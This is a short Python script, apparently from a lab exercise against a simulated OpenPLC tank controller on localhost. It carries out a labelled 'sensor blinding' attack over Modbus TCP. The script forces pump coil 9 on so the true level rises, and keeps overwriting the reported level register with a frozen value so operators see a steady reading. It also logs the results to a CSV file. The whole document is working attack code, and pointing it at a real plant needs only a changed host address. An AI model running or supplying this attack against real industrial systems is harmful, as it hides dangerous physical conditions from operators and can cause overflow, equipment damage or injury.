from pymodbus.client import ModbusTcpClient
import time, datetime, csv

HOST = 'localhost'
PORT = 5021
UNIT = 1
FROZEN_VALUE = 53   # what we'll force the reported register to show

client = ModbusTcpClient(HOST, port=PORT)
client.connect()

log = []
t_start = datetime.datetime.utcnow().isoformat()
print(f"=== SENSOR BLINDING START: {t_start} ===")
print(f"Freezing reported level register at {FROZEN_VALUE}, forcing pump ON via coil 9 underneath")

# Put pump on manually so the TRUE level actually rises, while we blind the reported register
client.write_coil(9, True, device_id=UNIT)

for i in range(36):  # ~3 minutes
    # blind the reported register every cycle
    client.write_register(0, FROZEN_VALUE, device_id=UNIT)
    time.sleep(5)
    reg = client.read_holding_registers(0, count=1, device_id=UNIT)
    reported_level = reg.registers[0]
    ts = datetime.datetime.utcnow().isoformat()
    log.append((ts, reported_level))
    print(f"{ts}  reported_level={reported_level} (forced frozen, true level rising underneath)")

t_end = datetime.datetime.utcnow().isoformat()
print(f"=== SENSOR BLINDING END: {t_end} ===")
print("Now check OpenPLC web UI live variable monitor for TRUE NiveauSimu value")

with open('attack_sensor_blinding_log.csv', 'w', newline='') as f:
    w = csv.writer(f)
    w.writerow(['timestamp','reported_level_frozen'])
    w.writerows(log)

client.close()
